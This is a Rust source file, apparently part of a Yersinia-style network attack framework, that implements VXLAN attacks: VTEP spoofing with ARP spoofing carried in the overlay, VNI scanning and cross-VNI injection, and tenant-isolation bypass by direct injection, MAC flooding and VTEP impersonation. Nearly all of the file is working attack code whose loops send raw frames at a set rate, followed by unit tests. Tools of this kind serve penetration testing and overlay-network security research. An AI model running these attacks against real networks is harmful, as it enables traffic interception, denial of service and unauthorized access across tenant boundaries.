//! VXLAN Attack Implementations

use super::packet::{vni_to_multicast_group, VxlanPacket, VxlanUdpPacket};
use async_trait::async_trait;
use std::net::Ipv4Addr;
use std::sync::atomic::Ordering;
use std::time::Duration;
use tokio::time;
use yersinia_core::{Attack, AttackContext, AttackStats, Result};
use yersinia_packet::{EtherType, EthernetFrame, MacAddress};

/// VXLAN VTEP Spoofing Attack
///
/// Spoofs a VXLAN Tunnel Endpoint (VTEP) to inject traffic into overlay
/// networks, intercept traffic, or manipulate MAC address learning.
#[derive(Debug, Clone)]
pub struct VxlanVtepSpoofingAttack {
    /// Spoofed VTEP source IP
    pub spoofed_vtep_ip: Ipv4Addr,
    /// Target VTEP IP (or multicast)
    pub target_vtep_ip: Option<Ipv4Addr>,
    /// VNI to target
    pub vni: u32,
    /// Source MAC for injected frames
    pub src_mac: [u8; 6],
    /// Destination MAC for injected frames
    pub dst_mac: [u8; 6],
    /// Use multicast for BUM traffic
    pub use_multicast: bool,
    /// Injection rate (packets/sec)
    pub rate_pps: u32,
}

impl VxlanVtepSpoofingAttack {
    pub fn new(spoofed_vtep_ip: Ipv4Addr, vni: u32) -> Self {
        Self {
            spoofed_vtep_ip,
            target_vtep_ip: None,
            vni,
            src_mac: [0x00, 0x11, 0x22, 0x33, 0x44, 0x55],
            dst_mac: [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF], // Broadcast
            use_multicast: true,
            rate_pps: 10,
        }
    }

    pub fn with_target_vtep(mut self, target_ip: Ipv4Addr) -> Self {
        self.target_vtep_ip = Some(target_ip);
        self.use_multicast = false;
        self
    }

    pub fn with_macs(mut self, src_mac: [u8; 6], dst_mac: [u8; 6]) -> Self {
        self.src_mac = src_mac;
        self.dst_mac = dst_mac;
        self
    }

    /// Build spoofed VXLAN packet
    pub fn build_packet(&self, payload: Vec<u8>) -> VxlanUdpPacket {
        let inner_packet = VxlanPacket::with_simple_frame(
            self.vni,
            self.dst_mac,
            self.src_mac,
            0x0800, // IPv4
            payload,
        );

        let src_port = rand::random::<u16>() | 0xC000; // Ephemeral port range

        if self.use_multicast {
            VxlanUdpPacket::multicast(self.spoofed_vtep_ip, src_port, inner_packet)
        } else {
            let target = self.target_vtep_ip.unwrap_or(self.spoofed_vtep_ip);
            VxlanUdpPacket::unicast(self.spoofed_vtep_ip, target, src_port, inner_packet)
        }
    }

    /// Build ARP spoofing packet inside VXLAN
    pub fn build_arp_spoof(&self, target_ip: Ipv4Addr) -> VxlanUdpPacket {
        // Simplified ARP packet construction
        let mut arp_payload = Vec::new();

        // Hardware type (Ethernet = 1)
        arp_payload.extend_from_slice(&1u16.to_be_bytes());
        // Protocol type (IPv4 = 0x0800)
        arp_payload.extend_from_slice(&0x0800u16.to_be_bytes());
        // Hardware size (6)
        arp_payload.push(6);
        // Protocol size (4)
        arp_payload.push(4);
        // Opcode (Reply = 2)
        arp_payload.extend_from_slice(&2u16.to_be_bytes());

        // Sender MAC
        arp_payload.extend_from_slice(&self.src_mac);
        // Sender IP
        arp_payload.extend_from_slice(&target_ip.octets());

        // Target MAC
        arp_payload.extend_from_slice(&self.dst_mac);
        // Target IP
        arp_payload.extend_from_slice(&target_ip.octets());

        let inner_packet = VxlanPacket::with_simple_frame(
            self.vni,
            self.dst_mac,
            self.src_mac,
            0x0806, // ARP
            arp_payload,
        );

        let src_port = rand::random::<u16>() | 0xC000;
        VxlanUdpPacket::multicast(self.spoofed_vtep_ip, src_port, inner_packet)
    }
}

/// VXLAN VNI Manipulation Attack
///
/// Manipulates VXLAN Network Identifiers to access unauthorized
/// network segments or bypass tenant isolation.
#[derive(Debug, Clone)]
pub struct VxlanVniManipulationAttack {
    /// Attacker VTEP IP
    pub vtep_ip: Ipv4Addr,
    /// Source VNI (attacker's network)
    pub source_vni: u32,
    /// Target VNIs to probe/access
    pub target_vnis: Vec<u32>,
    /// MAC address for probing
    pub probe_mac: [u8; 6],
    /// VNI scanning mode
    pub scan_mode: bool,
    /// VNI range for scanning
    pub scan_range: (u32, u32),
}

impl VxlanVniManipulationAttack {
    pub fn new(vtep_ip: Ipv4Addr, source_vni: u32) -> Self {
        Self {
            vtep_ip,
            source_vni,
            target_vnis: vec![],
            probe_mac: [0x00, 0xDE, 0xAD, 0xBE, 0xEF, 0x00],
            scan_mode: false,
            scan_range: (1, 4096), // Common VNI range
        }
    }

    pub fn add_target_vni(mut self, vni: u32) -> Self {
        self.target_vnis.push(vni);
        self
    }

    pub fn enable_scan(mut self, start: u32, end: u32) -> Self {
        self.scan_mode = true;
        self.scan_range = (start, end);
        self
    }

    /// Build VNI probe packet
    pub fn build_probe(&self, target_vni: u32) -> VxlanUdpPacket {
        // Send broadcast frame to probe VNI
        let inner_packet = VxlanPacket::with_simple_frame(
            target_vni,
            [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF],
            self.probe_mac,
            0x0800,
            vec![0x00; 64], // Dummy payload
        );

        let multicast_group = vni_to_multicast_group(target_vni);
        let src_port = rand::random::<u16>() | 0xC000;

        VxlanUdpPacket::new(self.vtep_ip, multicast_group, src_port, inner_packet)
    }

    /// Generate all VNI probes
    pub fn build_all_probes(&self) -> Vec<VxlanUdpPacket> {
        let mut packets = vec![];

        if self.scan_mode {
            for vni in self.scan_range.0..=self.scan_range.1 {
                packets.push(self.build_probe(vni));
            }
        } else {
            for &vni in &self.target_vnis {
                packets.push(self.build_probe(vni));
            }
        }

        packets
    }

    /// Build cross-VNI packet (inject into different VNI)
    pub fn build_cross_vni_inject(&self, target_vni: u32, payload: Vec<u8>) -> VxlanUdpPacket {
        let inner_packet = VxlanPacket::with_simple_frame(
            target_vni,
            [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF],
            self.probe_mac,
            0x0800,
            payload,
        );

        let multicast_group = vni_to_multicast_group(target_vni);
        let src_port = rand::random::<u16>() | 0xC000;

        VxlanUdpPacket::new(self.vtep_ip, multicast_group, src_port, inner_packet)
    }
}

/// VXLAN Tenant Isolation Bypass Attack
///
/// Attempts to bypass multi-tenant isolation in VXLAN environments
/// by exploiting misconfigurations or vulnerabilities in VTEP implementations.
#[derive(Debug, Clone)]
pub struct VxlanTenantBypassAttack {
    /// Attacker VTEP IP
    pub vtep_ip: Ipv4Addr,
    /// Attacker's legitimate VNI
    pub attacker_vni: u32,
    /// Target tenant VNI
    pub target_vni: u32,
    /// Attack mode
    pub mode: TenantBypassMode,
    /// Attacker MAC
    pub attacker_mac: [u8; 6],
    /// Target MAC (if known)
    pub target_mac: Option<[u8; 6]>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TenantBypassMode {
    /// Direct VNI injection
    DirectInjection,
    /// MAC flooding to overflow learning table
    MacFlooding,
    /// VTEP impersonation
    VtepImpersonation,
}

impl VxlanTenantBypassAttack {
    pub fn new(vtep_ip: Ipv4Addr, attacker_vni: u32, target_vni: u32) -> Self {
        Self {
            vtep_ip,
            attacker_vni,
            target_vni,
            mode: TenantBypassMode::DirectInjection,
            attacker_mac: [0x00, 0x0C, 0x29, 0xAA, 0xBB, 0xCC],
            target_mac: None,
        }
    }

    pub fn set_mode(mut self, mode: TenantBypassMode) -> Self {
        self.mode = mode;
        self
    }

    pub fn with_target_mac(mut self, mac: [u8; 6]) -> Self {
        self.target_mac = Some(mac);
        self
    }

    /// Build direct injection packet
    pub fn build_direct_injection(&self, payload: Vec<u8>) -> VxlanUdpPacket {
        let dst_mac = self
            .target_mac
            .unwrap_or([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);

        let inner_packet = VxlanPacket::with_simple_frame(
            self.target_vni, // Inject into target VNI
            dst_mac,
            self.attacker_mac,
            0x0800,
            payload,
        );

        let multicast_group = vni_to_multicast_group(self.target_vni);
        let src_port = rand::random::<u16>() | 0xC000;

        VxlanUdpPacket::new(self.vtep_ip, multicast_group, src_port, inner_packet)
    }

    /// Build MAC flooding packet
    pub fn build_mac_flood(&self, iteration: u32) -> VxlanUdpPacket {
        // Generate unique MAC for each iteration
        let flood_mac = [
            0x00,
            0xAA,
            ((iteration >> 24) & 0xFF) as u8,
            ((iteration >> 16) & 0xFF) as u8,
            ((iteration >> 8) & 0xFF) as u8,
            (iteration & 0xFF) as u8,
        ];

        let inner_packet = VxlanPacket::with_simple_frame(
            self.target_vni,
            [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF],
            flood_mac,
            0x0800,
            vec![0x00; 64],
        );

        let multicast_group = vni_to_multicast_group(self.target_vni);
        let src_port = rand::random::<u16>() | 0xC000;

        VxlanUdpPacket::new(self.vtep_ip, multicast_group, src_port, inner_packet)
    }

    /// Build VTEP impersonation packet (from different source IP)
    pub fn build_vtep_impersonation(
        &self,
        spoofed_vtep: Ipv4Addr,
        payload: Vec<u8>,
    ) -> VxlanUdpPacket {
        let dst_mac = self
            .target_mac
            .unwrap_or([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);

        let inner_packet = VxlanPacket::with_simple_frame(
            self.target_vni,
            dst_mac,
            self.attacker_mac,
            0x0800,
            payload,
        );

        let multicast_group = vni_to_multicast_group(self.target_vni);
        let src_port = rand::random::<u16>() | 0xC000;

        VxlanUdpPacket::new(spoofed_vtep, multicast_group, src_port, inner_packet)
    }
}

#[async_trait]
impl Attack for VxlanVtepSpoofingAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_micros(1_000_000 / self.rate_pps.max(1) as u64);

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let vxlan_pkt = self.build_packet(vec![0xCC; 128]);
            let vxlan_bytes = vxlan_pkt.to_bytes();

            let dst_mac = MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
            let src_mac = MacAddress(ctx.interface.mac_address.0);

            let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::IPv4, vxlan_bytes);
            let frame_bytes = frame.to_bytes();

            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                eprintln!("Error sending VXLAN VTEP spoofing packet: {}", e);
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "VXLAN VTEP Spoofing"
    }
}

#[async_trait]
impl Attack for VxlanVniManipulationAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let probes = self.build_all_probes();
        let interval = Duration::from_millis(100);

        for (idx, vxlan_pkt) in probes.iter().enumerate() {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let vxlan_bytes = vxlan_pkt.to_bytes();

            let dst_mac = MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
            let src_mac = MacAddress(ctx.interface.mac_address.0);

            let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::IPv4, vxlan_bytes);
            let frame_bytes = frame.to_bytes();

            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                if idx % 100 == 0 {
                    eprintln!("Error sending VXLAN VNI probe {}: {}", idx, e);
                }
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "VXLAN VNI Manipulation"
    }
}

#[async_trait]
impl Attack for VxlanTenantBypassAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(100);
        let mut iteration = 0u32;

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let vxlan_bytes = match self.mode {
                TenantBypassMode::DirectInjection => {
                    self.build_direct_injection(vec![0xAA; 128]).to_bytes()
                }
                TenantBypassMode::MacFlooding => self.build_mac_flood(iteration).to_bytes(),
                TenantBypassMode::VtepImpersonation => {
                    let spoofed_ip = Ipv4Addr::new(10, 0, 0, 100 + (iteration % 10) as u8);
                    self.build_vtep_impersonation(spoofed_ip, vec![0xBB; 128])
                        .to_bytes()
                }
            };

            let dst_mac = MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
            let src_mac = MacAddress(ctx.interface.mac_address.0);

            let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::IPv4, vxlan_bytes);
            let frame_bytes = frame.to_bytes();

            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                eprintln!("Error sending VXLAN tenant bypass packet: {}", e);
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }

            iteration = iteration.wrapping_add(1);
            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "VXLAN Tenant Isolation Bypass"
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_vtep_spoofing() {
        let attack = VxlanVtepSpoofingAttack::new("10.0.0.1".parse().unwrap(), 100);
        let packet = attack.build_packet(vec![0x00; 64]);

        assert_eq!(packet.vxlan.vni(), 100);
        assert_eq!(packet.src_ip, "10.0.0.1".parse::<Ipv4Addr>().unwrap());
    }

    #[test]
    fn test_vni_manipulation() {
        let attack = VxlanVniManipulationAttack::new("10.0.0.1".parse().unwrap(), 100)
            .add_target_vni(200)
            .add_target_vni(300);

        let probes = attack.build_all_probes();
        assert_eq!(probes.len(), 2);
    }

    #[test]
    fn test_tenant_bypass() {
        let attack = VxlanTenantBypassAttack::new("10.0.0.1".parse().unwrap(), 100, 200);

        let packet = attack.build_direct_injection(vec![0x00; 64]);
        assert_eq!(packet.vxlan.vni(), 200); // Targeting different tenant
    }
}
